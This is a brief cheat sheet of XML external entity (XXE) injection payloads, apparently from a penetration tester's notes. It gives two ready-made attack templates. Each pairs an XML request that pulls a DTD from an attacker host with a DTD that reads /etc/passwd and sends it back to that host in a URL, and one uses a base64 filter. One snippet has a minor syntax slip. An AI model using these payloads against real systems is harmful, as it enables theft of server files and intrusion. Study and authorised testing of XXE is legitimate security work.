# XXE

Insert entities into xml that request external ressources or deliver internal file contents.


## Common XEE:

xxe.xml:
```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://<ip>:<port>xxe.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>
```
xxe.dtd
```
!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://<ip>:<port>/?%data;'>">
```


## Out-of-band XXE:

Request
```
<?xml version="1.0"?>
<!DOCTYPE thp[
	<!ELEMENT thp ANY>
	<!ENTITY % dtd SYSTEM "http://<attackerip>/payload.dtd">
%dtd;]>
<thp></thp>
```
Payload:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://<attackerip>/collect=%file'>">
%all 
```

tags: xxe